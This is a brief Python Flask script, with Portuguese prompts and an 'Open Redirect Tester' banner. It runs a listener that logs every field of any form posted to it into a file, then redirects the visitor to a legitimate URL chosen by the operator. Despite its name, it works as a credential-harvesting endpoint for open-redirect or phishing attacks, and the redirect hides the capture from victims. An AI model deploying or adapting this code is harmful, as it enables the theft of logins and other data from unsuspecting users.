from flask import Flask, redirect, request
from termcolor import cprint
from pyfiglet import figlet_format

app = Flask(__name__)

#Imprime o banner
print("\n")
cprint('##########################################', 'red')
cprint(figlet_format('Open Redirect Tester', font='digital'),'yellow', attrs=['bold'])
cprint('v 0.1.0 ################## by: Guto Brutus', 'red')

print("\n")

HOST = input('Informe o host que irá receber os dados: ')
PORT = input('Informe a porta que o receptor de dados irá escutar: ')
URL_REDIRECT = input('Informe a URL válida que o usuário deveria ser redirecionado no alvo: ')

print("\n")

@app.route('/redirapp', methods=['HEAD', 'GET', 'POST'])
def redirapp():

    print('Iniciando a captura de dados do form')

    with open('dados.txt', 'a') as arquivo:
        for key, value in request.form.items():
            print(f'Capturando campo {key}, que possui valor: {value}')
            arquivo.write(f'Campo -> {key} - Valor -> {value} \n')

    return redirect(URL_REDIRECT)

if __name__ == '__main__':
    app.run(host=HOST, port=PORT)

